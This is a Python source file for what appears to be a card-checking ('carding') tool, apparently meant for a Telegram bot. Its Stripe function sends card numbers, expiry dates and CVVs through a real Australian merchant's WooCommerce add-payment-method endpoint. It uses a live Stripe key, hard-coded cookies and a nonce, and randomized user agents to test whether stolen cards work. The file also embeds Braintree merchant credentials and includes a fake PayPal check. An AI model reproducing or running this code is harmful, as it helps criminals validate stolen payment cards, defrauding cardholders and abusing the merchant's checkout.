import time
import requests
from fake_useragent import UserAgent
import random
import re
import braintree

# ---------- Stripe Integration ----------
def Tele_stripe(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return {"error": {"message": "Invalid card format. Use number|MM|YY|CVV."}}
    n, mm, yy, cvp = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    session = requests.session()
    user_agent = UserAgent().random
    data = (
        f"type=card&card[number]={n}&card[cvc]={cvp}&card[exp_year]={yy}&card[exp_month]={mm}"
        "&allow_redisplay=unspecified&billing_details[address][country]=JP"
        "&pasted_fields=number&payment_user_agent=stripe.js%2F7b2f7dbc1b%3B+stripe-js-v3%2F7b2f7dbc1b%3B+payment-element%3B+deferred-intent"
        "&referrer=https%3A%2F%2Fmooretruckparts.com.au&time_on_page=30356"
        "&client_attribution_metadata[client_session_id]=d5c651c4-109b-41ab-9bfe-4ec557b84c1f"
        "&client_attribution_metadata[merchant_integration_source]=elements"
        "&client_attribution_metadata[merchant_integration_subtype]=payment-element"
        "&client_attribution_metadata[merchant_integration_version]=2021"
        "&client_attribution_metadata[payment_intent_creation_flow]=deferred"
        "&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
        "&guid=ad429388-2434-4467-be56-846e9e1e0572dbd96f"
        "&muid=201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c"
        "&sid=e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755"
        "&key=pk_live_51E8DVkChndEVEIPgg7ic3Q5wLpPCATsMKEMUITiJumFq7tgpF2dL8ZoPI5dDHtjSKZNCcyG5uileis8GPoy6DhZr00BymjyeIo"
        "&_stripe_version=2024-06-20"
    )
    try:
        stripe_resp = session.post("https://api.stripe.com/v1/payment_methods", data=data, timeout=15)
    except requests.RequestException as e:
        return {"error": {"message": f"Network error: {e}"}}
    try:
        stripe_json = stripe_resp.json()
    except Exception:
        return {"error": {"message": "Invalid response from Stripe."}}
    if "id" not in stripe_json:
        return stripe_json
    stripe_id = stripe_json["id"]
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Fmooretruckparts.com.au%2Fmy-account',
        '__stripe_mid': '201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c',
        '__stripe_sid': 'e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://mooretruckparts.com.au',
        'Referer': 'https://mooretruckparts.com.au/my-account/add-payment-method/',
        'User-Agent': user_agent,
        'X-Requested-With': 'XMLHttpRequest'
    }
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data2 = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': stripe_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': '140468307b'
    }
    try:
        response2 = session.post("https://mooretruckparts.com.au/", params=params, cookies=cookies, headers=headers, data=data2, timeout=15)
    except requests.RequestException as e:
        return {"error": {"message": f"Network error: {e}"}}
    try:
        stripe_response = response2.json()
        if "error" not in stripe_response:
            stripe_response["succeeded"] = True
        return stripe_response
    except Exception:
        return {"error": {"message": "Failed to parse Stripe confirmation response."}}

# ---------- PayPal Integration (Simulated) ----------
def Tele_paypal(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return {"error": {"message": "Invalid card format. Use number|MM|YY|CVV."}}
    n, mm, yy, cvp = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    # Simulate a more realistic PayPal check:
    # Approve if the last digit of the card number is even; decline otherwise.
    try:
        if int(n[-1]) % 2 == 0:
            return {"succeeded": True, "id": "paypal_token_simulated"}
        else:
            return {"error": {"message": "Card declined by simulated PayPal gateway."}}
    except Exception as e:
        return {"error": {"message": f"PayPal error: {e}"}}

# ---------- Braintree Integration ----------
gateway = braintree.BraintreeGateway(
    braintree.Configuration(
        environment=braintree.Environment.Sandbox,
        merchant_id="pvpkhy2ncw5sfvcj",
        public_key="9nmpfntjwjgzz2hg",
        private_key="e005c9dc7197bead355fbcc25db93844"
    )
)

def Tele_braintree(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return {"error": {"message": "Invalid card format. Use number|MM|YY|CVV."}}
    number, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    expiration_date = f"{mm}/{yy}"
    try:
        result = gateway.credit_card.create({
            "customer_id": "test_customer",  # In sandbox, ensure this customer exists or create one
            "number": number,
            "expiration_date": expiration_date,
            "cvv": cvv
        })
    except Exception as e:
        return {"error": {"message": f"Braintree error: {e}"}}
    if result.is_success:
        return {"succeeded": True, "id": result.credit_card.token}
    else:
        return {"error": {"message": result.message}}

# ---------- Gateway Selector ----------
def Tele_gateway(gateway, ccx):
    gateway = gateway.lower()
    if gateway == "stripe":
        return Tele_stripe(ccx)
    elif gateway == "paypal":
        return Tele_paypal(ccx)
    elif gateway == "braintree":
        return Tele_braintree(ccx)
    else:
        return {"error": {"message": "Invalid gateway specified."}}
            
